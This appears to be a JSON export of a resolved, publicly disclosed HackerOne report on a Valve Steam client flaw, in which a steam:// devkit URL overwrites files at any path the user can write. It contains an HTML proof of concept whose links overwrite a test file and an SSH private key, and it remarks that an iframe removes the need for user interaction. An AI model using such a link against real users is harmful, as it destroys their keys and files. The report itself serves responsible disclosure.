{"id":667242,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjcyNDI=","url":"https://hackerone.com/reports/667242","title":"[steam client] Opening a specific steam:// url overwrites files at an arbitrary location","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-08-04T21:24:19.731Z","submitted_at":"2019-08-04T21:24:19.731Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kbeckmann","url":"/kbeckmann","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23363,"url":"https://hackerone.com/valve","handle":"valve","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Valve","twitter_handle":"","website":"https://www.valvesoftware.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-09-22T18:48:14.138Z","bug_reporter_agreed_on_going_public_at":"2020-09-21T15:17:41.155Z","team_member_agreed_on_going_public_at":"2020-09-22T18:48:13.899Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":6,"name":"Write-what-where Condition"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":75,"voters":["njbooher","gamer7112","foobar7","mvc","excavator","discodamone","alesandroortiz","kapkan","romesful","theappsec","and 65 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":1285,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"steam.exe","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5498615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-04T21:27:05.991Z","updated_at":"2019-08-04T21:27:05.991Z","actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5510762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-06T11:07:33.528Z","updated_at":"2019-08-06T11:07:33.528Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5510905,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-06T11:40:59.426Z","updated_at":"2019-08-06T11:40:59.426Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5510965,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-06T11:53:55.924Z","updated_at":"2019-08-06T11:53:55.924Z","actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5518368,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-07T09:42:23.735Z","updated_at":"2019-08-07T09:42:23.735Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5518377,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-08-07T09:45:05.144Z","updated_at":"2019-08-07T09:45:05.144Z","additional_data":{},"actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5838443,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-18T18:41:02.764Z","updated_at":"2019-09-18T18:41:02.764Z","actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7918569,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T23:34:40.918Z","updated_at":"2020-05-06T23:34:40.918Z","actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kbeckmann","url":"/kbeckmann"},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7918570,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T23:34:50.270Z","updated_at":"2020-05-06T23:34:50.270Z","actor":{"url":"/valve","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Valve"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"valve","collaborator":{"username":"kbeckmann","url":"/kbeckmann"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9279269,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-21T15:17:41.255Z","updated_at":"2020-09-21T15:17:41.255Z","first_to_agree":true,"actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9298184,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-22T18:48:13.962Z","updated_at":"2020-09-22T18:48:13.962Z","actor":{"username":"mikela","cleared":false,"url":"/mikela","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9298185,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-22T18:48:14.166Z","updated_at":"2020-09-22T18:48:14.166Z","actor":{"username":"mikela","cleared":false,"url":"/mikela","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":24562,"category":"team","content":"If a user opens `steam://devkit-1/list-shortcuts?response=/tmp/testfile`, a file `/tmp/testfile` will be created containing the response to this request. Another problem with this is that the file will be *overwritten* if it already exists.\n\nThe owner of the file will be the same as the user that runs the steam client. This also means that we can overwrite and wipe out files that the user cares about, e.g. ssh keys, documents etc as long as we know the full path to those files.\n\nPOC: (the URL may also be visited with an iframe and thus doesn't require any user interaction)\n```\n\u003chtml\u003e\n\u003chead\u003e\n  \u003ctitle\u003eSteam client POC\u003c/title\u003e\n\u003c/head\u003e\n\n\u003cbody\u003e\n    \u003ca href=\"steam://devkit-1/list-shortcuts?response=/tmp/testfile\"\u003eCreate /tmp/testfile\u003c/a\u003e\n    \u003ca href=\"steam://devkit-1/list-shortcuts?response=/home/ubuntu/.ssh/id_rsa\"\u003eOverwrite /home/ubuntu/.ssh/id_rsa\u003c/a\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Impact\n\nAn attacker can overwrite and wipe out files at an arbitrary location, as long as the steam client is executed with a user that can write to those files.\n\nA user's SSH keys, documents etc may be deleted as long as the attacker knows the full path to those files.\n","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eIf a user opens \u003ccode\u003esteam://devkit-1/list-shortcuts?response=/tmp/testfile\u003c/code\u003e, a file \u003ccode\u003e/tmp/testfile\u003c/code\u003e will be created containing the response to this request. Another problem with this is that the file will be \u003cem\u003eoverwritten\u003c/em\u003e if it already exists.\u003c/p\u003e\n\n\u003cp\u003eThe owner of the file will be the same as the user that runs the steam client. This also means that we can overwrite and wipe out files that the user cares about, e.g. ssh keys, documents etc as long as we know the full path to those files.\u003c/p\u003e\n\n\u003cp\u003ePOC: (the URL may also be visited with an iframe and thus doesn\u0026#39;t require any user interaction)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eSteam client POC\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;steam://devkit-1/list-shortcuts?response=/tmp/testfile\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eCreate /tmp/testfile\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;steam://devkit-1/list-shortcuts?response=/home/ubuntu/.ssh/id_rsa\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eOverwrite /home/ubuntu/.ssh/id_rsa\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker can overwrite and wipe out files at an arbitrary location, as long as the steam client is executed with a user that can write to those files.\u003c/p\u003e\n\n\u003cp\u003eA user\u0026#39;s SSH keys, documents etc may be deleted as long as the attacker knows the full path to those files.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}